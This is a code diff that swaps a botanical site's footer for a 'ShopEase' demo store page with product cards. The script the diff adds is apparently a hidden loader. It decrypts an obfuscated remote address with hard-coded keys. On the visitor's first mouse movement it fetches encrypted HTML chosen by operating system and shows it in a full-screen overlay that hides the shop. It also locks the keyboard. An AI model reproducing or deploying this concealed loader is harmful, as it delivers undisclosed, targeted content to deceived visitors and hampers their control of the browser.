-                </div>
-                <div class="footer-nav-col">
-                    <h4>Standards & Ethics</h4>
-                    <ul>
-                        <li><a href="privacy.html">Privacy Policy</a></li>
-                        <li><a href="terms.html">Terms of Service</a></li>
-                        <li><a href="disclaimer.html">Botanical Disclaimer</a></li>
-                        <li><a href="cookies.html">Cookie Policy</a></li>
-                    </ul>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; <?php echo date('Y'); ?> SpiceBowlMint Botanical Atelier LLC. All rights reserved. Elevated herbology & grain gastronomy.</p>
-                <div class="footer-legal-links">
-                    <a href="privacy.html">Privacy</a>
-                    <a href="terms.html">Terms</a>
-                    <a href="disclaimer.html">Disclaimer</a>
-                    <a href="cookies.html">Cookies</a>
-                </div>
-            </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
-    </footer>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
 
-    <script src="script.js"></script>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
+
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-pointer-lock allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1+ZV4B4shIyEYopUetzDlM8rBCY07decV0ugFl6IZehLUPZK3pNzYk+";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
